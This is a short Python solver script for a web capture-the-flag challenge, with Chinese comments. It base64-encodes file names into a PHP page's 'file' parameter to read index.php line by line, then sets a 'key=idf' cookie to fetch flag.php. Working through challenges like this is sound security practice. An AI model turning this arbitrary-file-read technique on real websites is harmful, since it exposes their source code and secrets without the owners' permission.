# -*- coding: utf-8 -*-
# version: Python3.X
# url: http://ctf.idf.cn/game/web/40/index.php?line=&file=ZmxhZy50eHQ
# 思路:
# 1. 看原始url，里面的file=，怀疑是base64，试一下, 加上2个等于号解密得到flag.txt
# 2. 试一下获取index.php的内容
# 3. 从index.php源码知道要获取flag.php的内容，同时得加个cookie["key"]
import base64
import requests

__author__ = '__L1n__w@tch'


def main():
    index_php = get_index_php()
    print(index_php)
    flag_php = get_flag_php()
    print(flag_php)


def get_flag_php():
    print("Start to get flag.php: ")
    flag_source_code = str()
    cookies = {"key": "idf"}
    file = base64.b64encode(b"flag.php").decode("utf8")
    url = "http://ctf.idf.cn/game/web/40/index.php?line={}&file={}".format(0, file)
    flag_source_code += requests.get(url, cookies=cookies).text

    return flag_source_code


def get_index_php():
    print("Start to get index.php: ")
    source_code = str()
    index_url = base64.b64encode(b"index.php").decode("utf8")
    for i in range(20):
        url = "http://ctf.idf.cn/game/web/40/index.php?line={}&file={}".format(i, index_url)
        response = requests.get(url)
        source_code += response.text

    return source_code


if __name__ == "__main__":
    main()
